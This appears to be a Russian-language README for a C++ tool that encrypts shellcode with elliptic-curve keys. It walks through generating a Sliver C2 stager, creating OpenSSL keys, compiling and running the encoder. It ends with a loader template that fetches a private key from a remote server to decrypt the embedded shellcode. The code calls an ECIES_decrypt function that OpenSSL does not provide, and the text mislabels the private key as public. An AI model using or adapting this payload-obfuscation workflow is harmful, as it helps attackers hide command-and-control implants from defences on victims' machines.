## Этот код поможет вам зашифровать свой shellcode с использованием метода эллиптических кривых.

**Requirements**
g++

if not install

```bash
apt install g++
```

openssl v3.1
sliver(or other c2)
libssl-dev 

```bash
libssl-dev
```

**Подготовка**
Сгенерируйте shellcode в формате **.bin.** Для этого вы можете использовать Bishop Fox Sliver в качестве C2, чтобы создать shellcode:

```bash
sliver> generate stager --lhost ip --lport 8443 --arch amd64 --format shellcode
```

При необходимости вы также можете использовать дополнительные параметры.

Сгенерируйте **.pem** ключи с помощью OpenSSL(prime256v1):

```bash
openssl ecparam -genkey -name prime256v1 -out new-ecc-private.pem
```
```bash
openssl ec -in new-ecc-private.pem -pubout -out new-ecc-public.pem
```

Клонируйте репозиторий с кодом для шифрования:


```bash
git clone github.com/wearetyomsmnv/ec_encoder_cpp
```

## Компиляция кода ##

Скомпилируйте код с помощью g++:

```bash
g++ ec_encoder.cpp -o encrypt_shellcode -lcrypto
```

## Запуск шифрования ##

**Запустите программу для шифрования:**

```bash
./encrypt_shellcode shellcode.bin new-ecc-private.pem new-ecc-public.pem
```

Где:

**shellcode.bin** - это файл с shellcode, полученный из Sliver (имя может отличаться).

**new-ecc-private.pem** - это открытый ключ.

**new-ecc-public.pem** - это открытый ключ.

## Как использовать это в реальном проекте ##

```c++
#include <iostream>
#include <openssl/evp.h>
#include <openssl/ec.h>
#include <openssl/err.h>
#include <openssl/pem.h>
#include <openssl/x509.h>
#include <curl/curl.h>

// Адрес сервера, предоставляющего .pem
static const char* SERVER_URL = "https://example.com/private-key.pem";

// Здесь должен быть ваш зашифрованный шеллкод
static const unsigned char encrypted_shellcode[] = {
    0xYY, 0xYY, 0xYY, ... // Зашифрованный шеллкод в формате байтов
};

// Функция обратного вызова для получения данных с сервера через libcurl
static size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    std::string *buffer = reinterpret_cast<std::string*>(userp);
    size_t total_size = size * nmemb;
    buffer->append(static_cast<char*>(contents), total_size);
    return total_size;
}

int main() {
    OpenSSL_add_all_algorithms();
    ERR_load_crypto_strings();
    curl_global_init(CURL_GLOBAL_DEFAULT);

    // Инициализация сессии libcurl
    CURL *curl = curl_easy_init();
    if (!curl) {
        std::cerr << "Ошибка при инициализации сессии libcurl" << std::endl;
        return 1;
    }

    // Установка URL для запроса
    curl_easy_setopt(curl, CURLOPT_URL, SERVER_URL);

    // Создание буфера для хранения полученного PEM-файла
    std::string pem_data;

    // Установка функции обратного вызова для записи данных
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &pem_data);

    // Выполнение запроса
    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        std::cerr << "Ошибка при выполнении запроса: " << curl_easy_strerror(res) << std::endl;
        curl_easy_cleanup(curl);
        return 1;
    }

    // Закрытие сессии libcurl
    curl_easy_cleanup(curl);

    // Преобразование PEM-данных в структуру ключа
    BIO *bio = BIO_new_mem_buf(pem_data.c_str(), -1);
    EC_KEY *key = PEM_read_bio_ECPrivateKey(bio, nullptr, nullptr, nullptr);
    if (!key) {
        std::cerr << "Ошибка при чтении приватного ключа из PEM-данных" << std::endl;
        BIO_free(bio);
        return 1;
    }
    BIO_free(bio);

    // Расшифрование с использованием приватного ключа
    size_t encrypted_len = sizeof(encrypted_shellcode);
    unsigned char decrypted[1024]; // Буфер для расшифрованных данных
    int decrypted_len = ECIES_decrypt(key, encrypted_shellcode, encrypted_len, decrypted, sizeof(decrypted));

    // Вывод расшифрованных данных
    std::cout << "Decrypted Data:" << std::endl;
    for (int i = 0; i < decrypted_len; ++i) {
        std::cout << std::hex << (int)decrypted[i];
    }
    std::cout << std::endl;

    // Освобождение ресурсов
    EC_KEY_free(key);

    // Очистка библиотеки OpenSSL
    ERR_free_strings();
    curl_global_cleanup();

    return 0;
}


```
